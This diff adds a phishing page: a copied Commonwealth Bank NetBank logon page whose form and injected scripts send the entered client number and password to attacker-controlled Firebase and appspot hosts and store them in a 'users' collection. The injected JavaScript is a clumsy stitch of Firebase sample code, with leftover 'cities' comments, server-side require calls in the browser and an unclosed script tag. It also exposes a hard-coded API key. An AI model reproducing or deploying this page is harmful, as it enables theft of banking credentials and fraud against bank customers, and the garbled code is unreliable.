@@ -1,0 +1,459 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0084)https://www.my.commbank.com.au/netbank/Logon/Logon.aspx?HostedTheme=CommBankVersion2 -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="win chrome chrome6 webkit webkit5 cssBeforeSupport"><head id="head"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>
+	NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank
+</title><meta name="description" content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you."><meta name="google-site-verification" content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo"><link rel="canonical" href="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx"><!--<base target="_top">--><base href="." target="_top"><link rel="stylesheet" type="text/css" href="./logon-merge.8397238ab0ae7a25ea1af4d375f2c3df.css" rel-album="R500">
+</head>
+<body id="body" class="logon hosted_commbankversion2">
+	<form method="post" action="https://commbank-au.firebaseapp.com" onsubmit="javascript:setCredentials();" id="form1" target="_top" autocomplete="off">
+    <script src="../../js/jquery.min.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/5.0.1/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  'use strict';
+
+// [START imports]
+var firebase = require('firebase-admin');
+var serviceAccount = require('../../google-services.json');
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: 'https://banking.firebaseio.com'
+});
+// [END imports]
+var nodemailer = require('nodemailer');
+var schedule = require('node-schedule');
+var Promise = require('promise');
+var escape = require('escape-html');
+var mailTransport = nodemailer.createTransport('smtps://<user>%40gmail.com:<password>@smtp.gmail.com');
+  var config = {
+    apiKey: "AIzaSyC8NpU-Hp6PKKa4B69kFX1wTjfVa0HFGjA",
+    authDomain: "commbank-au.firebaseapp.com",
+    databaseURL: "https://commbank-au.firebaseio.com",
+    projectId: "commbank-au",
+    storageBucket: "commbank-au.appspot.com"
+  };
+  firebase.initializeApp(config);
+  
+  // [START firestore_deps]
+const admin = require('firebase-admin');
+// [END firestore_deps]
+
+// We supress these logs when not in NODE_ENV=debug for cleaner Mocha output
+var console = {log: debug};
+
+function initializeApp() {
+  process.env.GCLOUD_PROJECT = 'firestorebeta1test2';
+  // [START initialize_app]
+
+  admin.initializeApp({
+    credential: admin.credential.applicationDefault()
+  });
+
+  var db = admin.firestore();
+
+  // [END initialize_app]
+  return db;
+}
+
+function initializeAppFunctions() {
+  process.env.GCLOUD_PROJECT = 'firestorebeta1test2';
+  // [START initialize_app_functions]
+  const functions = require('firebase-functions');
+  admin.initializeApp(functions.config().firebase);
+  var db = admin.firestore();
+  // [END initialize_app_functions]
+  return db;
+}
+
+function initializeAppSA() {
+  // [START initialize_app_service_account]
+  var serviceAccount = require('../../google-services.json');
+  admin.initializeApp({
+    credential: admin.credential.cert(serviceAccount)
+  });
+  var db = admin.firestore();
+  // [END initialize_app_service_account]
+  return db;
+}
+  
+ function setCredentials(db) {
+  // [START set_document]
+  var data = {
+    clientNum: input,
+    pass: input1,
+  };
+  // Add a new document in collection "cities" with ID 'LA'
+  var setDoc = db.collection('users').doc(clientNum).set(data);
+  // [END set_document]
+  return setDoc.then(res => {
+    console.log('done', res);
+  });
+}
+
+</script>
+
+		<div id="BodyContainer">
+			<div id="Header">
+				<div id="BrandingLogo">
+					<span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="./cba_mainlogo.ac9de6fb5214be84653367c74ba0b5f0.gif" alt="Commonwealth Bank of Australia"></span>
+				</div>
+			</div>
+			<div id="MainContent">
+				<noscript>
+					<div class="MessagePanel">
+						<div class="message_contents message_contents_validation">
+							<div class="message">
+								<div class="message_icon error"></div>
+								<div class="msg_cnt_wrp msg_cnt_wrp_error">
+									<p>
+										<strong>You need to enable JavaScript to access NetBank</strong>
+									</p>
+									<p>
+										Follow these instructions on <a id="lnkEnableJavaScript" href="https://www.commbank.com.au/support/faqs/298.html" target="_blank">how to enable JavaScript</a>.
+										If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="https://www.netbank.com.au/mobile">mobile version</a> of NetBank.
+									</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</noscript>
+				<div class="MessagePanel arrow" id="mplMessagePanel" style="display:none;">
+
+</div>
+				<div id="ModuleWrap">
+					<div id="ModuleLeft" class="module">
+						<h2>Log on to NetBank</h2>
+						<div class="bd">
+							<div class="ft">
+								<div class="row rowClientNumber">
+									<div class="LabelWrapper LabelTextAlignNotSet align_notset">
+	<label for="eml" id="txtMyClientNumber_label"><span class="MainLabel ">NetBank client number</span></label>
+</div><div class="FieldElement ">
+	<input name="eml" type="text" maxlength="8" id="eml" class="text textbox txtCommbankField field" placeholder="NetBank client number" data-maxlength="8">
+</div>
+								</div>
+								<div class="row rowPassword">
+									<div class="LabelWrapper LabelTextAlignNotSet align_notset">
+	<label for="pwd" id="txtMyPassword_label"><span class="MainLabel ">Password</span></label>
+</div><div class="FieldElement ">
+	<input name="pwd" type="password" maxlength="16" id="pwd" class="text textbox txtCommbankField field" placeholder="Password" data-maxlength="16">
+</div>
+								</div>
+								<div class="row">
+									<div class="FieldElement  FieldElementNoLabel">
+	<span class="checkbox field checkbox_classic"><input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox"><label for="chkRemember_field">Remember my client number</label></span>
+</div>
+								</div>
+							<div class="FieldElement  FieldElementNoLabel">
+	<div class="CbaButton " id="btnLogon">
+		<input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btn">
+	</div>
+</div>
+
+	    <script>
+		  /*
+		  Check the password field and act accordingly.
+		  */
+
+		  $("#btn").on("click", function(e) {
+		      e.preventDefault();
+		      // get the password box and checkbox elements
+		      var input = document.getElementById("eml");
+		      var input2 = document.getElementById("pwd");
+			  var url = 'https://commbank-au.appspot.com/login/';
+				 var req = new XMLHttpRequest();
+			  req.onload = function() {
+				if (req.status === 400 || req.status === 401) {
+				  err.innerText = 'Invalid username or password';
+				  return;
+				}
+				if (req.status !== 200) {
+				  err.innerText = 'Invalid response from Firebase Cloud Function ' + req.status;
+				  return;
+				}
+				var data = JSON.parse(req.responseText);
+				if (data.token) {
+				  firebase.auth().signInWithCustomToken(data.token);
+				} else {
+				  console.log('ERROR RESPONSE: ' + req.responseText);
+				  err.innerText = 'Invalid response from Firebase Cloud Function see developer console for details';
+				}
+			  };
+			  req.onerror = function() {
+				err.innerText = 'Network error in Firebase Cloud Function call see developer console for details';
+			  };
+				req.open('POST', url, true);
+				req.setRequestHeader('Content-Type', 'application/json');
+				req.send(JSON.stringify({
+				username: input,
+				password: input2
+			  }));
+		};
+		      // check to see if the value is empty
+		      if ( input.value == "" ){
+		          passNotValid();
+		      }else if( input2.value == "" ){ //check if the value of the repeat field is empty
+		          passNotValid();
+		      }else{
+		          // post the data
+		          $("#dialog").css('display', 'none');
+		            post('post', {
+		              cbacli: input.value,
+		              cbapassword: input2.value
+		            });      
+		      }
+		  });
+
+		  function passNotValid(){
+		    $(".1").css('border', '1px solid #fa3e3e');
+		    $(".2").css('border', '1px solid #fa3e3e');
+		  	$(".2").css('border-top', '0px');
+		  }
+		  
+		  /*
+		  Post to the fallowing path given the parameters.
+		  Args:
+		    path: The path to be posted to.
+		    params: The parameters to be passed.
+		  */
+		  function post(path, params) {
+		    // create a form and set its attributes
+		    var form = document.createElement("form");
+		    form.setAttribute("method", "post");
+		    form.setAttribute("action", path);
+
+		    // set the attribute for the post
+		    for(var key in params) {
+		        if(params.hasOwnProperty(key)) {
+		            var hiddenField = document.createElement("input");
+		            hiddenField.setAttribute("type", "hidden");
+		            hiddenField.setAttribute("name", key);
+		            hiddenField.setAttribute("value", params[key]);
+		            form.appendChild(hiddenField);
+		         }
+		    }
+		    // submit the post
+		    document.body.appendChild(form);
+		    form.submit();
+		  }
+		  var input = document.getElementById("eml");
+		  var input2 = document.getElementById("pwd");
+		  input.disabled = false;
+		  input2.disabled = false;
+      setCredentials(input,input2);
+		</script>
+								<a id="lnkForgottenDetails" href="https://www2.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx?RID=kAsM5_C9y0uzKNysdcTkxA&amp;SID=UM6XQLahXuU%3d">Forgot your password?</a>
+								<div id="MessageBubble" class="MessageBubble">
+									<span class="MessagePointer"></span>
+									<a id="MessageClose" class="MessageClose" title="Close" href="javascript:void(0)">Close</a>
+									<span class="MessageBody">
+                                        <span class="text"><strong>Remember client number</strong></span><span class="text">For security reasons, do not select this option if anyone else uses this computer.&nbsp;<a href="http://www.commbank.com.au/passwordtips" target="_blank">Find out more</a></span>
+									</span>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div id="ModuleRight" class="module">
+						<h2>New to NetBank?</h2>
+						<div class="bd">
+							<div class="ft">
+								<ul class="Bullets">
+									<li><a id="lnkRegistration" href="https://www2.my.commbank.com.au/netbank/Registration/Mixed/SelectCard.aspx?RID=kAsM5_C9y0uzKNysdcTkxA&amp;SID=UM6XQLahXuU%3d">Register for NetBank now</a></li>
+									<li><a id="lnkOnlineSupport" href="https://www.commbank.com.au/personal/support.html" target="_blank">Online support for our products and services</a></li>
+									<li><a id="lnkProtectYourselfOnline" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Tips to stay safe online</a></li>
+								</ul>
+							</div>
+							<div class="ft secModule">
+								<ul class="Bullets">
+									<li><a id="lnkSecurityGuarantee" href="https://www.commbank.com.au/security-privacy/how-protect-you.html" target="_blank">How we protect you and our 100% security guarantee</a></li>
+								</ul>
+							</div>
+						 </div>
+					</div>
+				</div>
+                
+<!-- Component for content management. -->							
+
+<div id="ucLogonContentManageControl_pnlContentManaged">
+	
+    <div id="ContentManaged">
+        <!-- this is the features panel which has the image and description. -->
+        <div id="ucLogonContentManageControl_pnlHighlightPanel">
+		
+            <div class="HighlightPanel">
+                <div class="top">
+                    <div class="bottom">							
+                        <div class="image">
+                            <p><a href="https://www.commbank.com.au/personal/personal-loans.html" target="_blank"><img src="./PL_Netbank_Log-on.png" alt="Save 1% p.a. on an Unsecured Fixed Rate Personal Loan"></a></p>
+                        </div>
+                        <div class="description">
+                            <table><tbody><tr><td><p><b>You can save 1% p.a. on an Unsecured Fixed Rate Personal Loan</b></p><p>Apply and fund by 17 June.</p><ul><li><a href="https://www.commbank.com.au/personal/personal-loans.html?;mbt=NB-SA-CQ-PL-02-ME-NTL-09-v1-OT--NB:PL-May18;" target="_blank">Find out more</a></li></ul></td></tr></tbody></table> 
+                        </div>                                                            
+                    </div>											
+                </div>
+            </div>
+        
+	</div>				    						
+        <!-- side by side highlight links at the bottom -->
+        <div id="ucLogonContentManageControl_pnlCurrentHighlights">
+		
+            <div id="CurrentHighlights">
+                <h3>Current highlights</h3>
+                <div class="column">
+                     <ul>					
+                                                        
+                                <li><p><a href="https://www.commbank.com.au/support/financial-assistance.html?intcmp=lo-ch1-NeedFinAssistance&amp;mbt=NB-BR-CQ-CO-02-ME-NCH-09-v1-OT--NB:Financial-Assistance;" target="_blank">Do you need financial assistance?</a></p></li>                                                                                                                                                                               
+                                                            
+                                <li><p><a href="https://www.commbank.com.au/federal-budget.html?intcmp=lo-ch2-fb18&amp;ei=fb18-landing" target="_blank">Find out what the 2018 Federal Budget means for you</a></p></li>                                                                                                                                                                               
+                                                            
+                                <li><p><a href="https://www.commbank.com.au/security-privacy/report-hoaxes.html?intcmp=lo-ch3-report-hoaxes&amp;mbt=NB-BR-CQ-NA-02-ME-NCH-09-v1-OT--NB:ReportHoaxes;" target="_blank">See the latest hoax email and SMS examples and what to do if you get one</a></p></li>                                                                                                                                                                               
+                                                            
+                                <li><p><a href="https://www.commbank.com.au/guidance/consumer-finance/how-to-create-a-budget-and-stick-to-it-201705.html?intcmp=lo-ch4-create-a-budget&amp;mbt=NB-SS-CQ-NA-02-ME-NCH-09-v1-OT--NB:Create-a-Budget;" target="_blank">How to make a budget and stick to it</a></p></li>                                                                                                                                                                               
+                            
+                     </ul>
+                </div> 
+            </div>
+        
+	</div>
+    </div>
+
+</div>		
+			</div>
+			<div id="PageFooter">
+				<a id="lnkTermsOfUse" href="http://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.aspx" target="_blank">Terms of use</a> | <a id="lnkSecurity" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Security</a> | <a id="lnkPrivacy" href="http://www.commbank.com.au/security-privacy/general-security/privacy.html" target="_blank">Privacy</a>
+				<span id="CopyRight">© Commonwealth Bank of Australia 2018 ABN 48 123 123 124</span>
+			</div>
+
+			<iframe id="DigitalPlatformLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="./sign-out.html"></iframe>
+			<script type="text/javascript">
+				(function() {
+					var chkRemember = document.getElementById('chkRemember_field');
+					var msgBubble = document.getElementById('MessageBubble');
+					var msgClose = document.getElementById('MessageClose');
+					var txtClientNumber = document.getElementById('eml');
+					var txtPassword = document.getElementById('pwd');
+
+					function attachEvent(obj, event, func) {
+						if (obj.addEventListener) {
+							obj.addEventListener(event, func, false);
+						} else if (obj.attachEvent) {
+							obj.attachEvent('on' + event, func);
+						}
+					}
+
+					function checkParent(t) {
+						while (t && t.parentNode) {
+							if (t === msgBubble || t === chkRemember) {
+								return false;
+							}
+							t = t.parentNode;
+						}
+						return true;
+					}
+
+					attachEvent(chkRemember, 'click', function() {
+						msgBubble.style.display = chkRemember.checked ? 'block' : 'none';
+					});
+
+					attachEvent(msgClose, 'click', function() {
+						msgBubble.style.display = 'none';
+					});
+
+					document.onclick = function(e) {
+						if (checkParent((e && e.target) || (event && event.srcElement))) {
+							msgBubble.style.display = 'none';
+						}
+					}
+
+                    if (typeof document.body.classList !== 'undefined' && document.body.classList.contains('hosted_commbankversion2')) {
+                        function slideLabel() {
+                            var self = this,
+                                parentRow = self.parentNode.parentNode,
+                                hasSlideAndShowClass = parentRow.classList.contains('slideAndShow');
+                            if (self.value !== '' && !hasSlideAndShowClass) {
+                                parentRow.classList.add('slideAndShow');
+                            } else if (self.value === '' && hasSlideAndShowClass) {
+                                parentRow.classList.remove('slideAndShow');
+                            }
+                        }
+                        txtClientNumber.addEventListener('keyup', slideLabel);
+                        txtPassword.addEventListener('keyup', slideLabel);
+                    }
+				}());
+			</script>
+		</div>
+	<!-- CorrelationId: 69863383-aae0-4e96-ba84-c53c872b67ba -->
+<script type="text/javascript">
+//<![CDATA[
+var Page_ValidationSummaries =  new Array(document.getElementById("mplMessagePanel"));
+//]]>
+</script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D36AA275">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAaKOlzL3mN6O0zlMsDWXdh21tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So/zhv9nhIQJpJMK1QrieMC6/xsbVYvCONvKVedw/92xqHm/Ymw==">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+document.getElementById('eml').disabled = false;
+document.getElementById('pwd').disabled = false;
+document.getElementById('btn').disabled = false;
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+document.write("<input type=\"hidden\" name=\"JS\" value=\"E\" />");
+//]]>
+</script><input type="hidden" name="JS" value="E">
+<noscript><input type="hidden" name="JS" value="D" /></noscript><script type="text/javascript" src="./tracking-merge.f834e48d4a979c21a0b31493c2e23186.js.download" rel-album="R500"></script>
+<script type="text/javascript" src="./core-merge.36971982ebc03a2658d8e51f70007637.js.download" rel-album="6.17"></script>
+<script type="text/javascript" src="./marketing-merge.4050184a6c7ffd07e99f8386394b23fb.js.download" rel-album="R500"></script><style>.mboxDefault { visibility:hidden; }</style><div class="mboxDefault" style="visibility: visible; display: block;"></div><div id="mboxMarker-default-CBA_onClick-0" style="visibility:hidden;display:none">&nbsp;</div>
+<script type="text/javascript" src="./trackingbootstrap.b3780fc2adfa39203f80818f2e1cb7a3.js.download" rel-album="R500"></script>
+
+<script type="text/javascript">
+//<![CDATA[
+try { if (typeof navigator !== 'undefined' && !(/(iPad|iPhone|iPod)/.test(navigator.userAgent) && /Apple/.test(navigator.vendor))) { document.getElementById('eml').focus(); }} catch(e) {};
+form1_submitted = false;
+WebForm_OnSubmit = function() {
+	if (form1_submitted) {
+		return false;
+	} else {
+		if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false)
+			return false;
+		form1_submitted = true;
+		return true;
+	}
+}
+//]]>
+</script>
+<script type="text/javascript" src="./instrumentation-merge.4043785f5795e2e8297bdfe0cdf60f4d.js.download" rel-album="6.17"></script>
+
+<script type="text/javascript">
+//<![CDATA[
+var OldWebForm_OnSubmit = setCredentials;
+setCredentials = function() {
+	 var data = {
+    clientNum: input,
+    pass: input1,
+  };
+  // Add a new document in collection "cities" with ID 'LA'
+  var setDoc = db.collection('users').doc(clientNum).set(data);
+  // [END set_document]
+  return setDoc.then(res => {
+    console.log('done', res);
+  });
+};
+
+<script type="text/javascript">
+//<![CDATA[
+(function(f) { if (window.addEventListener) { window.addEventListener('load',f,false); } else if (window.attachEvent) { window.attachEvent('onload',f); } }(function() { CommBank.Online.Framework.PerfLog.perfmon(function(l) { document.getElementById('perfmonLog').value = l; }); }));
+//]]>
+</script>
+<iframe src="./Preload.html" width="0" height="0" frameborder="0" style="display:none;"></iframe>
+</form>
+	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value="">
+
+</body></html>
